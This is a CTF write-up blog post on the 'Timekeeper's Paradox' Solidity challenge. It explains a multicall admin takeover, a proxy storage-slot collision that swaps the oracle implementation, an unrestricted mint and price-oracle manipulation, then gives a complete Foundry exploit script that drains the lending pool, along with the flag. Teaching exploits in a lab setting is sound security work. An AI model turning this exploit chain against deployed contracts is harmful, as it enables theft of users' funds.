---
layout: post
title: "Timekeeper's Paradox - Compfest26 CTF Writeup"
date: 2026-10-06 10:00:00 +0530
description: "CTF writeup for Timekeeper's Paradox from Compfest26 CTF "
categories: [Writeups, CTF, Web3 Security]
tags: [ctf, web3, solidity, compfest, proxy]
author: Sarayu
toc: true
---

there are 6 files provided to us.

firstly, lets look at the purpose of each contract:TimeKepeerToken

The challenge deploys a DeFi ecosystem:

- **TimekeeperToken (TKG)** – A ERC‑20 governance token contract with a **public `mint`**  function that anyone can call, with no limit.
- **TimekeeperOracle** – Price feed (TKG/ETH) with TWAP history.
- **TimekeeperProxy** – Upgradeable proxy wrapping the oracle.
- **TimekeeperLending** – Lending pool holding 50 ETH and 500,000 TKG.
- **TimekeeperGovernance** – DAO with 51% quorum.
- **Setup** – Deploys everything, gives player 10,000 TKG, checks `lending.balance == 0`.

## TimeKeeperOracle

Firstly, let us look at setup.sol

```javascript
function isSolved() external view returns (bool) {

return address(lending).balance == 0;

}
```

To solve this challenge, we need to drain the balance of the lending contract to zero.

Check out the storage layout of the oracle contract:

- Slot 0: `admin`
- Slot 1: `reporter`
- Slot 2: `latestPrice`
- Slot 3: `observations`

---

The `reporter` is stored at slot 1, which collides with the proxy's `implementation` variable. Let's look at the proxy's storage layout now.

**TimekeeperProxy storage layout:**

- Slot 0: `admin`
- Slot 1: `implementation`
- Slot 2: `pendingAdmin`
- Slot 3: `validImplementations`

slot 1 in the proxy is `implementation`, but in the oracle it's `reporter`. since the proxy uses `delegatecall` to run the oracle's code, any write to `reporter` actually writes to the proxy's storage slot 1, which is `implementation`. So if we can call `setReporter`, we can overwrite the proxy's implementation address directly, without having to use `upgradeTo` function.

Now, how do we get to call `setReporter`? The oracle's `setReporter` has `require(msg.sender == admin)`. The admin is the proxy's admin? Lets look at it.

When the proxy delegatecalls to the oracle, the `admin` variable in the oracle's code actually reads from the proxy's slot 0, which is the proxy's `admin`. So if we become the proxy admin, we can call `setReporter` on the proxy (which forwards to the oracle) and it will pass the admin check. And then it writes to slot 1, changing the proxy's implementation.

But first, we need to become the proxy admin. The proxy has a `multicall` function that lets you execute multiple calls on the proxy itself. And `setPendingAdmin` requires `msg.sender == address(this)`. When `multicall` calls `address(this).call(data)`, the `msg.sender` inside that call is the proxy's address. So we can bypass the `onlySelf` check

Executing the attack:

1. Use `multicall` to call `setPendingAdmin(player)`.
2. Then call `acceptAdmin()` to become the admin.
3. Deploy a fake oracle that returns price = 1.
4. Call `setReporter(fakeOracle)` on the proxy. This writes to slot 1, setting `implementation` to our fake oracle.
5. Now the proxy's price feed is our fake oracle.
6. Mint unlimited TKG using the public `mint`.
7. Deposit TKG as collateral into the lending pool.
8. Borrow all eth because the price is now 1

Attack script:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "./Setup.sol";
import "./TimekeeperProxy.sol";
import "./TimekeeperLending.sol";
import "./TimekeeperToken.sol";

contract FakeOracle {
    function getLatestPrice() external pure returns (uint256) {
        return 1;
    }
}

contract Exploit is Script {
    function run() external {
        address setupAddr = vm.envAddress("SETUP_CONTRACT_ADDR");
        address player = vm.envAddress("WALLET_ADDR");
        uint256 privateKey = vm.envUint("PRIVKEY");

        Setup setup = Setup(setupAddr);
        TimekeeperToken token = TimekeeperToken(setup.token());
        TimekeeperProxy proxy = TimekeeperProxy(setup.proxy());
        TimekeeperLending lending = TimekeeperLending(setup.lending());

        vm.startBroadcast(privateKey);

        // 1. Become proxy admin via multicall
        bytes memory data = abi.encodeWithSignature("setPendingAdmin(address)", player);
        bytes[] memory calls = new bytes[](1);
        calls[0] = data;
        proxy.multicall(calls);
        proxy.acceptAdmin();

        // 2. Deploy fake oracle
        FakeOracle fake = new FakeOracle();

        // 3. Storage collision: overwrite proxy implementation via setReporter
        (bool success, ) = address(proxy).call(
            abi.encodeWithSignature("setReporter(address)", address(fake))
        );
        require(success, "setReporter failed");

        // 4. Mint unlimited TKG
        uint256 mintAmount = 10_000_000 * 10**18;
        token.mint(player, mintAmount);

        // 5. Deposit as collateral
        token.approve(address(lending), type(uint256).max);
        lending.depositToken(mintAmount);

        // 6. Borrow all ETH
        uint256 poolBalance = address(lending).balance;
        lending.borrowETH(poolBalance);

        vm.stopBroadcast();

        require(setup.isSolved(), "Exploit failed");
        console.log("Lending pool drained! Solved.");
    }
}
```

executing the script:

```bash
forge script Exploit.s.sol:Exploit \
  --rpc-url $RPC_URL \
  --private-key $PRIVKEY \
  --broadcast \
  -vvvv
```

flag: COMPFEST18{t1m3k33p3r_pr1c3_0r4cl3_m4n1p_v14_st0r4g3_c0ll1s10n_le4k3dddddd_n0000000}


the exploit worked because of three main issues: the `multicall` function letting us become admin, the public `mint` giving us infinite tokens, and the storage collision allowing us to swap the oracle implementation. The lending pool blindly trusted the oracle price, so we set it to 1 and borrowed everything.